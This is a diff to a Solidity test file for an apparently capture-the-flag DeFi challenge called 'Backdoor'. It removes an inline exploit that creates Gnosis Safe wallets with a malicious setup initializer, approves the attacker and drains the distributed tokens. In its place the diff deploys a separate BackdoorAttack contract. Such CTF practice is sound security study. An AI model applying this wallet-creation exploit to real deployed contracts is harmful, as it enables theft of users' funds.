@@ -11,6 +11,7 @@ import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
 import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
 import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
+import {BackdoorAttack} from "./BackdoorAttack.sol";
 
 contract Backdoor is Test {
     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
@@ -78,58 +79,20 @@ contract Backdoor is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function exploitUser(address user) internal {
-        /**
-         * EXPLOIT START *
-         */
-        // 1. Setup Gnosis Save "setup" transaction
-        address[] memory owners = new address[](1);
-        owners[0] = user;
-        bytes memory initializer = abi.encodeWithSignature(
-            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
-            owners,
-            1,
-            address(0),
-            new bytes(0),
-            address(dvt),
-            address(0),
-            0,
-            attacker
-        );
-
-        // 2. Create a Gnosis Safe wallet safe wallet through the factory
-        GnosisSafe proxy = GnosisSafe(
-            payable(
-                address(
-                    walletFactory.createProxyWithCallback({
-                        _singleton: address(masterCopy),
-                        initializer: initializer,
-                        saltNonce: 0x1,
-                        callback: walletRegistry
-                    })
-                )
-            )
-        );
-
-        // 3. Approve attacker address to spend DVT for proxy
-        IERC20(address(proxy)).approve(address(attacker), type(uint256).max);
-
-        // 4. Transfer DVT from proxy to attacker
-        dvt.transferFrom({from: address(proxy), to: attacker, amount: dvt.balanceOf(address(proxy))});
-
-        /**
-         * EXPLOIT END *
-         */
-    }
-
     function testExploit() public {
         /**
          * EXPLOIT START *
          */
         vm.startPrank(attacker);
-        for (uint256 i = 0; i < users.length; i++) {
-            exploitUser(users[i]);
-        }
+        BackdoorAttack backdoorAttack = new BackdoorAttack{value: 0.05 ether}({
+            _dvt: address(dvt),
+            _masterCopy: address(masterCopy),
+            _walletFactory: address(walletFactory),
+            _walletRegistry: address(walletRegistry),
+            _users: users,
+            _attacker: attacker
+        });
+        vm.label(address(backdoorAttack), "BackdoorAttack");
         vm.stopPrank();
         /**
          * EXPLOIT END *
@@ -157,5 +120,10 @@ contract Backdoor is Test {
 
         // Attacker must have taken all tokens
         assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+
+    receive() external payable {
+        // Do nothing
+        console.log("Received ETH test", msg.value);
     }
 }
